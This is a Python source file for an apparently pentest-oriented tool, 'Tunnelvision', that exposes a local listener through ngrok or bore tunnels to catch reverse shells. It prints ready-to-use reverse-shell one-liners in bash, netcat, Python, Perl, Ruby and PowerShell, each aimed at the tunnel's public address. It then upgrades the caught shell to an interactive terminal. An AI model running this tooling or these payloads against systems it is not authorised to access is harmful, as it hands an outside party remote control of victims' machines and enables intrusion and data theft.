#!/usr/bin/env python3

import argparse
import atexit
import os
import signal
import subprocess
import sys
from time import sleep

from dotenv import load_dotenv
from pwnlib.tubes.listen import listen

try:
    import ngrok

    NGROK_INSTALLED = True
except ImportError:
    NGROK_INSTALLED = False


SUPPORTED_SHELLS = [
    "sh",
    "/bin/sh",
    "bash",
    "/bin/bash",
    "ash",
    "bsh",
    "csh",
    "ksh",
    "zsh",
    "pdksh",
    "tcsh",
    "mksh",
    "dash",
    "fish",
]


# Color codes for output
class Colors:
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    BLUE = "\033[94m"
    PURPLE = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    END = "\033[0m"


def colored_print(text: str, color: str = Colors.WHITE):
    """Print text with color to stderr"""
    print(f"{color}{text}{Colors.END}", file=sys.stderr)


def execute(conn: listen, cmd: str):
    """Execute a command on the remote connection"""
    conn.sendline(cmd.encode())
    print(conn.recv().decode(), end="")
    sleep(0.1)


def check_ngrok_auth() -> bool:
    """Check if ngrok auth token is available"""
    load_dotenv()
    if not os.getenv("NGROK_AUTHTOKEN"):
        colored_print("No NGROK_AUTHTOKEN set in environment - options:", Colors.RED)
        colored_print(
            '  - Add a .env file with "NGROK_AUTHTOKEN=<your-token>"', Colors.WHITE
        )
        colored_print(
            '  - Set with "export NGROK_AUTHTOKEN=<your-token>" before running',
            Colors.WHITE,
        )
        colored_print(
            f'  - Run the script as "NGROK_AUTHTOKEN=<your-token> python {" ".join(sys.argv)}"\n',
            Colors.WHITE,
        )
        return False

    return True


def setup_bore_tunnel(
    port: int, server: str = "bore.pub"
) -> tuple[subprocess.Popen, str, int, str]:
    """Set up bore tunnel and return connection details"""
    colored_print("[+] Setting up bore tunnel...", Colors.BLUE)

    try:
        # Start bore tunnel process
        process = subprocess.Popen(
            ["bore", "local", "--to", server, str(port)],
            stdout=subprocess.PIPE,
            text=True,
        )

        # Read the output to get the port
        try:
            public_port = int(
                process.stdout.readline().split("remote_port\x1b[0m\x1b[2m=\x1b[0m")[-1]
            )
        except Exception as e:
            colored_print(f"[!] Could not parse bore port from output: {e}", Colors.RED)
            exit()

    except FileNotFoundError:
        colored_print("[!] bore command not found. Please install bore:", Colors.RED)
        colored_print("  - Install with: cargo install bore-cli", Colors.WHITE)
        colored_print(
            "  - Or download from: https://github.com/ekzhang/bore/releases",
            Colors.WHITE,
        )
        exit()
    except Exception as e:
        colored_print(f"[!] Error setting up bore tunnel: {e}", Colors.RED)
        exit()

    # Resolve the server IP
    try:
        ip = subprocess.check_output(("getent", "ahostsv4", server)).split()[0].decode()
    except subprocess.CalledProcessError:
        # Fallback if getent fails (e.g., on some systems)
        colored_print(f"[!] Could not resolve IP for {server}", Colors.YELLOW)
        ip = server

    return process, ip, public_port, server


def setup_ngrok_tunnel(port: int) -> tuple[ngrok.Listener, str, int, str]:
    """Set up ngrok tunnel and return connection details"""
    if check_ngrok_auth():
        colored_print("[+] Setting up ngrok tunnel...", Colors.BLUE)

    try:
        public_listener = ngrok.forward(port, authtoken_from_env=True, proto="tcp")
    except Exception as err:
        colored_print(f"[!] Error setting up ngrok tunnel: {err.args[-1]}", Colors.RED)
        for line in err.args[1:-1]:
            colored_print(line, Colors.WHITE)
        exit()

    url = public_listener.url()
    hostname, public_port = url.replace("tcp://", "").split(":")

    # Lookup IP of hostname with fallback
    try:
        ip = (
            subprocess.check_output(("getent", "ahostsv4", hostname))
            .split()[0]
            .decode()
        )
    except subprocess.CalledProcessError:
        # Fallback if getent fails (e.g., on some systems)
        colored_print(
            f"[!] Could not resolve IP for {hostname}, using hostname", Colors.YELLOW
        )
        ip = hostname

    return public_listener, ip, int(public_port), hostname


def print_revshell_examples(
    ip: str, public_port: int, shell: str, is_linux: bool, is_windows: bool
):
    """Print reverse shell examples"""
    colored_print(
        "=============== REVSHELL EXAMPLES ===============\n", Colors.BOLD + Colors.PURPLE
    )

    if not is_windows:
        colored_print("Bash:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(f"bash -i >& /dev/tcp/{ip}/{public_port} 0>&1", Colors.YELLOW)
        colored_print("────────────────────────────────────────────\n", Colors.WHITE)

    colored_print("Netcat:", Colors.CYAN)
    colored_print("────────────────────────────────────────────", Colors.WHITE)
    colored_print(
        f"nc{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}", Colors.YELLOW
    )
    colored_print(
        f"ncat{'.exe' if is_windows else ''} {ip} {public_port} -e {shell}",
        Colors.YELLOW,
    )
    colored_print("────────────────────────────────────────────\n", Colors.WHITE)

    if not is_windows:
        colored_print("Python:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{public_port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────\n", Colors.WHITE)

        colored_print("Perl:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""perl -e 'use Socket;$i="{ip}";$p={public_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");}};'""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────\n", Colors.WHITE)

        colored_print("Ruby:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""ruby -rsocket -e'spawn("{shell}",[:in,:out,:err]=>TCPSocket.new("{ip}",{public_port}))'""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────\n", Colors.WHITE)

    if not is_linux:
        colored_print("PowerShell:", Colors.CYAN)
        colored_print("────────────────────────────────────────────", Colors.WHITE)
        colored_print(
            f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{public_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". {{ $data }} 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
            Colors.YELLOW,
        )
        colored_print("────────────────────────────────────────────\n", Colors.WHITE)

    colored_print("See more examples at https://www.revshells.com/\n", Colors.CYAN)
    colored_print(
        "=================================================\n", Colors.BOLD + Colors.PURPLE
    )


def upgrade_linux_shell(conn: listen):
    """Upgrade Linux shell with QoL improvements"""
    colored_print("[+] Trying to upgrade shell...", Colors.BLUE)

    # Try different Python versions for PTY upgrade
    python_commands = [
        """python3 -c 'import pty; pty.spawn("/bin/bash")'""",
        """python -c 'import pty; pty.spawn("/bin/bash")'""",
        """python3 -c 'import pty; pty.spawn("/bin/sh")'""",
        """python -c 'import pty; pty.spawn("/bin/sh")'""",
    ]

    upgrade_successful = False
    for cmd in python_commands:
        try:
            execute(conn, cmd)
            upgrade_successful = True
            break
        except Exception as _err:
            continue

    if not upgrade_successful:
        colored_print("[!] Could not upgrade shell with PTY", Colors.YELLOW)

    # Make shell echo raw characters to allow for proper terminal interaction
    subprocess.run("stty raw -echo", shell=True)
    execute(conn, "reset")

    # Set up shell improvements
    execute(conn, "alias ls='ls -lha --color=auto'")
    execute(conn, "export SHELL=bash")
    execute(conn, "export TERM=xterm-256color")

    # Get local stty rows and cols and set remote
    try:
        stty = subprocess.check_output(["stty", "-a"]).decode().split("; ")
        rows, cols = stty[1][5:], stty[2][8:]
        execute(conn, f"stty rows {rows} cols {cols}")
    except (subprocess.CalledProcessError, IndexError):
        colored_print("[!] Could not get terminal dimensions", Colors.YELLOW)


def cleanup_bore(process: subprocess.Popen):
    """Clean up bore tunnel"""
    try:
        process.terminate()
        process.wait(timeout=5)
        colored_print("\n[+] Bore tunnel closed", Colors.GREEN)
    except subprocess.TimeoutExpired:
        process.kill()
        colored_print("\n[+] Bore tunnel force-closed", Colors.GREEN)
    except Exception as e:
        colored_print(f"[!] Error closing bore tunnel: {e}", Colors.RED)

    subprocess.run("stty sane", shell=True)


def cleanup_ngrok(public_listener: ngrok.Listener):
    """Clean up ngrok tunnel"""
    try:
        ngrok.disconnect(public_listener.url())
        colored_print("\n[+] Ngrok tunnel closed", Colors.GREEN)
    except Exception as e:
        colored_print(f"[!] Error closing ngrok tunnel: {e}", Colors.RED)

    subprocess.run("stty sane", shell=True)


def signal_handler(_signum: int, _frame):
    """Handle interrupt signals"""
    colored_print("\n[!] Interrupted! Cleaning up...", Colors.YELLOW)
    sys.exit(0)


def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments using argparse"""
    parser = argparse.ArgumentParser(
        description="Tunnelvision - Automate reverse shell setup using tunnel services (ngrok or bore)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 4444                            # Use bore (default) with bash
  %(prog)s 4444 --tunnel ngrok             # Use ngrok with bash
  %(prog)s 4444 --shell powershell         # Use bore with PowerShell
  %(prog)s 4444 --tunnel ngrok --shell sh  # Use ngrok with sh shell
  %(prog)s 4444 --to my-bore-server.com    # Use custom bore server
        """,
    )

    parser.add_argument("port", type=int, help="Local port to listen on (1-65535)")

    parser.add_argument(
        "--tunnel",
        "-t",
        choices=["ngrok", "bore"],
        default="bore",
        help="Tunnel type to use (default: %(default)s)",
    )

    parser.add_argument(
        "--shell",
        "-s",
        type=str,
        default="bash",
        help="Shell type for reverse shell examples (default: %(default)s)",
    )

    parser.add_argument(
        "--to",
        type=str,
        default="bore.pub",
        help="Remote server for bore tunnel (default: %(default)s). Only used with bore tunnel.",
    )

    parser.add_argument(
        "--quiet",
        "-q",
        action="store_true",
        help="Don't print reverse shell examples",
    )

    # Validate port range
    args = parser.parse_args()
    if not (1 <= args.port <= 65535):
        parser.error(f"Port must be between 1 and 65535, got: {args.port}")

    return args


def main():
    # Set up signal handlers for cleanup
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    args = parse_arguments()
    if args.tunnel == "ngrok" and not NGROK_INSTALLED:
        colored_print("[!] ngrok not found. Please install ngrok:", Colors.RED)
        colored_print("  - Install with: pip install ngrok", Colors.WHITE)
        exit()

    # Determine shell type and platform
    shell = args.shell
    is_linux = False
    is_windows = False

    if shell in ("powershell", "pwsh", "cmd"):
        shell = "powershell" if shell == "pwsh" else shell
        is_windows = True
    elif shell in SUPPORTED_SHELLS:
        is_linux = True
    else:
        colored_print(
            f'[!] Shell "{shell}" is unknown but will be shown in the examples.',
            Colors.YELLOW,
        )
        colored_print("[!] Shell will not be attempted upgraded.\n", Colors.YELLOW)

    # Set up tunnel based on selected type and register cleanup functions
    if args.tunnel == "bore":
        tunnel_obj, ip, public_port, hostname = setup_bore_tunnel(args.port, args.to)
        atexit.register(lambda: cleanup_bore(tunnel_obj))
    else:
        tunnel_obj, ip, public_port, hostname = setup_ngrok_tunnel(args.port)
        atexit.register(lambda: cleanup_ngrok(tunnel_obj))

    colored_print(f"[+] Listening at {ip}:{public_port} ({hostname})...\n", Colors.GREEN)
    
    if not args.quiet:
        print_revshell_examples(ip, public_port, shell, is_linux, is_windows)

    colored_print("[+] Waiting for connection...", Colors.BLUE)
    colored_print("    Press Ctrl+C to exit", Colors.CYAN)

    try:
        conn = listen(args.port).wait_for_connection()
        colored_print("[+] Connection received!", Colors.GREEN)

        if is_linux:
            upgrade_linux_shell(conn)
        elif is_windows:
            conn.sendline(b"")

        conn.interactive()
    except KeyboardInterrupt:
        colored_print("\n[!] Interrupted by user", Colors.YELLOW)
    except Exception as e:
        colored_print(f"\n[!] Unexpected error: {e}", Colors.RED)


if __name__ == "__main__":
    main()
